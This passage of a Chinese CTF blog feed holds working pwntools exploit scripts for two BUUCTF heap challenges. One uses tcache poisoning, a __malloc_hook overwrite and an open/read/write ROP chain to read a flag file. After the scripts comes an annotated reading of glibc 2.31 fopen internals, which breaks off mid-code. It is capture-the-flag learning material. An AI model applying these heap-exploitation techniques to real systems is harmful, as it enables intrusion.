class="keyword">import</span>*</span><br><span class="line">sh=process(<span class="string">&#x27;./2019_one_punch&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y:sh.sendafter(x,y)</span><br><span class="line">su  = <span class="keyword">lambda</span> x  :sh.recvuntil(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x  :sh.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;50086&#x27;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx=<span class="built_in">int</span>,size=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;hero name: &#x27;</span>,size*content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>(<span class="params">idx=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;hero name: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;50056&#x27;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">recvdata2=u64(sh.recv()[<span class="number">11</span>:][:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=recvdata2 &amp; <span class="number">0xFFFFFFFFF000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base_addr======&gt;&quot;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x120</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;hero name: &#x27;</span>)</span><br><span class="line">recvdata1=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">main_arena_addr=recvdata1-<span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;mainarena==========&gt;&quot;</span>,<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_base=main_arena_addr-<span class="number">0x1ECB80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr==========&gt;&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">1</span>)    <span class="comment">##改这个的bk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x300</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line">fd=heap_base+<span class="number">0x31C0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fd==&gt;&quot;</span>,fd)</span><br><span class="line">fake_bk=heap_base+<span class="number">0x30</span>-<span class="number">0x10</span>-<span class="number">5</span></span><br><span class="line">pal=<span class="number">0x300</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(fd)+p64(fake_bk)</span><br><span class="line">rename(<span class="number">1</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#------------------------------------------</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x217</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">malloc_hook=main_arena_addr-<span class="number">0x10</span></span><br><span class="line">rename(<span class="number">0</span>,p64(malloc_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>)     <span class="comment">##要先放到tcache才能改tcache的数量，不然放不进去，然后再magic</span></span><br><span class="line">debug()</span><br><span class="line">magic(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">magic(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">magic_gadget = libc_base+<span class="number">0x000000000008cfd6</span></span><br><span class="line">payload = p64(magic_gadget)</span><br><span class="line">magic(payload) <span class="comment"># __malloc_hook --&gt; gadget(add rsp,0x48)</span></span><br><span class="line"></span><br><span class="line">p_rdi = libc_base + <span class="number">0x0000000000026542</span></span><br><span class="line">p_rsi = libc_base + <span class="number">0x0000000000026f9e</span></span><br><span class="line">p_rdx = libc_base + <span class="number">0x000000000012bda6</span></span><br><span class="line">p_rax = libc_base + <span class="number">0x0000000000047cf8</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000cf6c5</span></span><br><span class="line">rop_heap = heap_base + <span class="number">0x44b0</span> <span class="comment"># &#x27;./flag&#x27; </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bad syscall</span></span><br><span class="line"><span class="comment"># rops = p64(p_rdi)+p64(rop_heap) + p64(p_rsi)+p64(0)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;open&#x27;]+libc_base)</span></span><br><span class="line"><span class="comment"># rops += p64(p_rdi)+p64(3)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;read&#x27;]+libc_base)</span></span><br><span class="line"><span class="comment"># rops += p64(p_rdi)+p64(1)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span></span><br><span class="line"><span class="comment"># rops += p64(libc.sym[&#x27;write&#x27;]+libc_base)</span></span><br><span class="line"></span><br><span class="line">rops = p64(p_rdi)+p64(rop_heap)</span><br><span class="line">rops += p64(p_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">2</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"><span class="comment">#rops += p64(libc.sym[&#x27;open&#x27;])</span></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rops += p64(p_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">rops += p64(p_rsi)+p64(heap_base+<span class="number">0x260</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0x70</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">0</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"><span class="comment">#rops += p64(libc.sym[&#x27;read&#x27;])</span></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rops += p64(p_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(p_rsi)+p64(heap_base+<span class="number">0x260</span>)</span><br><span class="line">rops += p64(p_rdx)+p64(<span class="number">0x70</span>)</span><br><span class="line">rops += p64(p_rax)+p64(<span class="number">1</span>)</span><br><span class="line">rops += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbs(&quot;b *__malloc_hook&quot;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;idx: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;hero name: &#x27;</span>,rops)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="metasequoia-2020-summoner"><a href="#metasequoia-2020-summoner" class="headerlink" title="metasequoia_2020_summoner"></a>metasequoia_2020_summoner</h2><p>本题其实只是一个纸老虎<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211053.png" alt="image-20240311224248322"></p><p>这便是题目的大意</p><p>但是他在free的时候free的其实是存储name的堆块，因此就很好构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29952</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">s</span>):</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summon</span>(<span class="params">name</span>):</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;summon &#x27;</span> + name)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>():</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;release&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Released.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strike</span>():</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;strike&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">summon(fake)</span><br><span class="line">release()</span><br><span class="line">summon(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">strike()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buu做题记录1&quot;&gt;&lt;a href=&quot;#buu做题记录1&quot; class=&quot;headerlink&quot; title=&quot;buu做题记录1&quot;&gt;&lt;/a&gt;buu做题记录1&lt;/h1&gt;&lt;p&gt;算是最近得做题记录了，就是一开始的比较简单呃就挺简洁的，所以后面跳到5，6页了，算是总结吧，</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>IO函数源码阅读</title>
    <link href="http://s1nec-1o.github.io/2024/03/03/IO%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>http://s1nec-1o.github.io/2024/03/03/IO%E5%87%BD%E6%95%B0%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</id>
    <published>2024-03-03T06:30:53.000Z</published>
    <updated>2024-04-28T14:13:05.428Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IO函数详解"><a href="#IO函数详解" class="headerlink" title="IO函数详解"></a>IO函数详解</h1><p>该版本为libc-2.31</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><h3 id="IO-new-fopen"><a href="#IO-new-fopen" class="headerlink" title="_IO_new_fopen"></a>_IO_new_fopen</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>__fopen_internal</code>函数</p><h3 id="fopen-internal"><a href="#fopen-internal" class="headerlink" title="__fopen_internal"></a>__fopen_internal</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO   <span class="comment">//没执行</span></span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));   <span class="comment">//first:分配空间</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO   <span class="comment">//没执行</span></span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);    <span class="comment">//second：初始化</span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;                    <span class="comment">//说明所有的_io_file_jump都是同一个vtable</span></span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);                    <span class="comment">//third：将file链接到_IO_list_all</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)   <span class="comment">//forth：打开文件</span></span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分配空间部分"><a href="#分配空间部分" class="headerlink" title="分配空间部分"></a>分配空间部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO   <span class="comment">//没执行</span></span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE)); </span><br></pre></td></tr></table></figure><p>主要是<code>locked_FILE</code>结构体，而其中包含了两个结构体一个<code>_IO_FILE_plus</code>，一个<code>_IO_wide_data</code>，而<code>_IO_FILE_plus</code>又包含<code>FILE</code>和<code>_IO_jump_t</code>，<code>_IO_jump_t</code>即vtable</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span>  <span class="comment">//unsigned short</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_wide_data</code>是用于处理宽字符的输入和输出的，只有在调用 glibc 提供的宽字符输入输出函数（如 <code>fgetwc()</code>、<code>fputwc()</code> 等）时，会使用 <code>_IO_wide_data</code> 结构体中的字段来处理宽字符数据的读取和写入。</p><p>至于<code>FILE</code>则是在<code>./libio/bits/types/FILE.h:typedef struct _IO_FILE FILE;</code>被赋为<code>_IO_FILE</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);    <span class="comment">//second：初始化</span></span><br><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;                    <span class="comment">//说明所有的_io_file_jump都是同一个vtable</span></span><br></pre></td></tr></table></figure><p>主要是其中的<code>_IO_no_init</code>，至于下一个语句就比较好理解，只要是同一种vtable类型，那么vtable就在libc.so段上，不能改，但是能改指向vtable的指针，就不过多缀叙了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">     <span class="keyword">struct</span> _IO_wide_data *wd, <span 